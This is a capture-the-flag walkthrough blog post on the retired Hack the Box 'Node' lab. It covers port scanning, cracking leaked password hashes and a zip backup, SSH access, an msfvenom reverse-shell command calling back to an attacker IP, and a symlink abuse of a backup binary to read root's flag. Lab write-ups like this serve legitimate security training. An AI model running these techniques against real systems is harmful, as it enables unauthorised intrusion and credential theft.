<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Box Challenge: Node Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-challenge-node-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-04-02T08:01:09+00:00">April 2, 2018</time><time class="updated" datetime="2025-07-06T18:31:14+00:00">July 6, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends!! Today we are going to solve another CTF challenge “<strong>Node</strong>” which is available online for those who want to increase their skill in penetration testing and black box testing. Node is retired vulnerable lab presented by <strong>Hack the Box</strong> for making online penetration practices according to your experience level; they have the collection of vulnerable labs as challenges from beginners to Expert level.</span></p>
<p><span style="color: #000000;"><strong>Level: </strong>Intermediate</span></p>
<p><span style="color: #000000;"><strong>Task:</strong> find <strong>user.txt</strong> and <strong>root.txt</strong> file on victim’s machine.</span></p>
<h3><span style="color: #800000;">Initial Reconnaissance and Web Enumeration</span></h3>
<p><span style="color: #000000;">Since these labs are online available therefore they have static IP and IP of sense is <strong>10.10.10.58</strong> so let’s begin with nmap port enumeration.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.10.10.58</pre>
<p><span style="color: #000000;">From given below image, you can observe we found port 22 and 3000 are open in victim’s network.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-7GDWF4UjvEQ/WsHW8ODFkoI/AAAAAAAAV88/dyWWQwgJNWo6_rssmLCsloAQi8bJXDIvQCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Knowing port 3000 is running HTTP on target machine we preferred to explore his IP our browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-nWCg6Xmm7jI/WsHW9jDIQwI/AAAAAAAAV9U/2MazCO4GqmYy5ZXNe3ijA2dnrFXvlJOTQCLcBGAs/s1600/2.png"/></span></p>
<h3><span style="color: #800000;">Discovering Credentials and Backup File</span></h3>
<p><span style="color: #000000;">We don’t find anything on the home page so we take a look at the source code of the page and go through javascripts. In one of the javascript we find a link to a page called /api/users/latest.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-kxlCUhrbnJs/WsHW-wDE57I/AAAAAAAAV9o/MAc-BBm2OkQXuGqX5MkpES5vWW3SqUsMwCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">We open /api/users and find a username and passwords in the hash.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-7S2_JtNIr1U/WsHW_FPNNMI/AAAAAAAAV9w/Pp-6wBqv_1UuJ58VzTmgMSgGT9-w8RkqwCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">We use <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://crackstation.net">https://crackstation.net</a></span> to decode the hashes that we found earlier.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-1xS9B5eknrc/WsHW_byWKgI/AAAAAAAAV90/a0X6Iv0FNUg6o9ub1dwtOZFELBK-NjmGACLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Then, we click on login and use one the username to login with its corresponding password. When we log in we find an option to download the backup. We click on it and it downloads a file called “myplace.backup”.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LP-YYSgITsc/WsHW_y6dEnI/AAAAAAAAV98/fx40gYktGWIA2OhWaamsRUYx3lJBPGRKACLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">We try to take a look at the downloaded file and find that it is base64 encoded.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-G35FaKpwSVI/WsHW_sz9OTI/AAAAAAAAV94/gbfVoYnaowYOVWaFG9WkSWczRIp4sWASwCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Now we decode the backup file and find it to be a zip file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat myplace.backup | base64 --decode &gt; myplace</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XP_shm4fMsc/WsHW_wYjfnI/AAAAAAAAV-A/sUFDy-Op3vEa3206zemBjGx874JF3Ks1wCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">When we try to unzip the file it asks for a password, so we use fcrackzip to brute-force the zip file using rockyou.txt as wordlist. After brute-forcing the file we find the password; we use this password to unzip the file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">fcrackzip -D -p /usr/share/wordlists/rockyou.txt data.zip</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Dg4VeMOd5L8/WsHXAmg036I/AAAAAAAAV-E/K-GwiCBibsQcys-plE039COPD2MTeCqcQCLcBGAs/s1600/9.png"/></span></p>
<h3><span style="color: #800000;">Gaining Initial Access via MongoDB</span></h3>
<p><span style="color: #000000;">After unzipping the file we find a file few HTML and javascript files that look like the implementation of node.js. In app.js we find the username and password hash for monogDB.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-O-CnH9wIREU/WsHW71OfXkI/AAAAAAAAV84/irdv40NhSHYqjSsILgTUusjuQWYH0L8rwCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">We use this username and password to login through ssh into the target machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Euvr_09_u4k/WsHW7zuDzDI/AAAAAAAAV80/uKotf4VWUtMM55ajv-ubgrxz3A0w69nvACLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">We use wget to download the linEnum.sh file into the target machine and use it to enumerate the machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-c2_YXpsxemU/WsHW8gS1ShI/AAAAAAAAV9A/NbsysoN0vjExrcqJ9h5bmA1uT5y7ETiPwCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">After logging in through ssh we download linEnum.sh into the target machine to enumerate the target machine and look for privilege escalation vectors.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-L6bD_7nUaM0/WsHW8ncw0WI/AAAAAAAAV9E/SB2jDzjJnukXCbzz8eQn7najXkfAGvOHQCLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">We find 3 directories inside the home that means there may be 3 users with this name.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-_9ZZhazdg7k/WsHW86_q9wI/AAAAAAAAV9I/6tpVEO0CoWYjEsIQAYrxJeT_Q-g8pSsMgCLcBGAs/s1600/17.png"/></span></p>
<p><span style="color: #000000;">When we take a look at the process running into the system, we find that it is running app.js as tom user.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0zecJUB8CBo/WsHW9Q_BY3I/AAAAAAAAV9M/ME_Ea5IEhlot_eQSY4m1tN70D3_ShkC7wCLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;">We open app.js and find the same username and password that we found earlier. It means that its backup was created using some script or program that we find earlier. Going through the file we also find this script calls for a file called backup in /usr/local/bin directory and uses a key to create a backup.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-At61KTdrYqQ/WsHW9QL-7TI/AAAAAAAAV9Q/6m2ZkxPZQHAa4JZlnUxW3FekF9d77k8awCLcBGAs/s1600/19.png"/></span></p>
<h3><span style="color: #800000;">Privilege Escalation via Backup Symlink</span></h3>
<p><span style="color: #000000;">Now that we know that the target machine is running mongoDB we use this to exploit the system and get a reverse shell.</span></p>
<p><span style="color: #000000;">We first create a python one-liner reverse shell using msfvenom.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p cmd/unix/reverse_python lhost=10.10.14.3 lport 8765 R</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-MexYIEanNhk/WsHW9yuOjRI/AAAAAAAAV9Y/R980z_to1l8f9I1U1huEeNfBzRGScU5gACLcBGAs/s1600/20.png"/></span></p>
<p><span style="color: #000000;">We copy the python command and paste in a bash file in /var/www/html in our system. Now we use wget to download it into the target machine. We get it read, write and execute permission using chmod. Then we schedule mongoDB to run the file using the username mark and the password we find in the javascript file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-hPpscfTzKWs/WsHW-F80D4I/AAAAAAAAV9c/4ct2ZDUO13Es3wD_FkutRs6n2NyXzB2QgCLcBGAs/s1600/21.png"/></span></p>
<p><span style="color: #000000;">We then set up our listener using netcat and wait for the reverse shell. After getting the reverse shell we spawn a tty shell using python and we find that we are login as tom user. Now we go to /home/tom directory and find the user.txt; when we open the file we get our first flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-8nioe2SwVbY/WsHW-VFIx5I/AAAAAAAAV9g/BaYTOP9Ahy0Y_pKjDwFPUotcDycjp-xiwCLcBGAs/s1600/22.png"/></span></p>
<p><span style="color: #000000;">Now we create a new directory test, and we then symlink root.txt in root directory with /tmp/test. We then use backup binary to create a zip file that creates a backup for /tmp/test/ directory. As the system links the /tmp/test directory to /root/root.txt, it will actually create a backup of the root.txt file in the root directory.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mkdir test
ln -s /root/root.txt /tmp/test
/usr/bin/backup -q “the key in app.js” /tmp/test</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-cg-0RGXcwco/WsHW-dCJLCI/AAAAAAAAV9k/bwZ1bwz5BRwfz4DwENQEyr3zLKD6XU4WgCLcBGAs/s1600/23.png"/></span></p>
<p><span style="color: #000000;">We again go the web page and download the backup file. We decode it in the similar manner we did earlier and use the password “magicword” we found earlier to unzip the file. After unzipping the file we find root.txt when we open the file we find our final flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oPl8lqWhf-Q/WsHW-6hR63I/AAAAAAAAV9s/9st7Wk9KGiYOMl2RD1huXfr2q87KKx9bACLcBGAs/s1600/24.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/sayantan-bera-2098a613b/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
